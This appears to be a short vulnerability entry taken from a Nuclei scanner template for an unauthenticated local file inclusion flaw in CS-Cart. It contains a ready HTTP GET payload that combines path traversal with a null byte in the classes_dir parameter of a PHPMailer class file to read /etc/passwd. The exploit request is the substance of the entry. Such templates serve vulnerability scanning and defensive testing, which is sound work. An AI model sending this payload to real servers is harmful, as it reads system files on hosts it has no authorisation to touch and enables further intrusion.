# Nuclei Template: CS-Cart - Local File Inclusion
**Template ID:** cs-cart-unauthenticated-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`cs-cart-unauthenticated-lfi.yaml`)

## Vulnerability Information & PoC

## Description
CS-Cart is vulnerable to local file inclusion because it allows remote unauthenticated attackers to access locally stored files and reveal their content.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

## References
- https://cxsecurity.com/issue/WLB-2020100100
